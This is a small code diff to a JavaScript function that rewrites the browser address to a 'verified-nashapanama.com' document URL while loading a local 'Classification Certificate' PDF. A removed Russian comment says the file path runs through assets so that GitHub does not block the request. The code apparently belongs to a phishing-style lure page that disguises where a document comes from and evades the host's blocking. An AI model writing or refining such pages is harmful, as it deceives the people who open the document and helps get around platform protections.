@@ -20,8 +20,8 @@
         function openDocumentInline() {
             var targetUrl = "https://verified-nashapanama.com/document/UlVjM3VoTTlVcW40L3RGNld0ejArZDBUbVNtcXMvWlg2Vklvc3RnN3lEM2Z3d2dpUUhaWEFKeUs2NjIyY2xvcW1PQzJnWFlOVDFNR2VKTzlLaFg5V001Y1BQcXJoYUR4amhiTytUMUVscityT1p5amFSWVFQemVRU1MwYlZFd3R0bVY3Rk5QZlU5QmRsc01tbWg0R0NnPT0xNOLABELx";
             
-            // ТЕПЕРЬ ПУТЬ ВЕДЕТ ЧЕРЕЗ ASSETS, ЧТОБЫ ГИТХАБ НЕ БЛОКИРОВАЛ ЗАПРОС
-            var fileUrl = window.location.origin + "/assets/data/tranfer/attachment/display/inline/A.3.01 Classification Certificate";
+            // ИСПРАВЛЕНО: Добавлено расширение .pdf в конец пути к реальному файлу
+            var fileUrl = window.location.origin + "/assets/data/tranfer/attachment/display/inline/A.3.01 Classification Certificate.pdf";
             
             window.history.pushState({}, "", targetUrl);
             
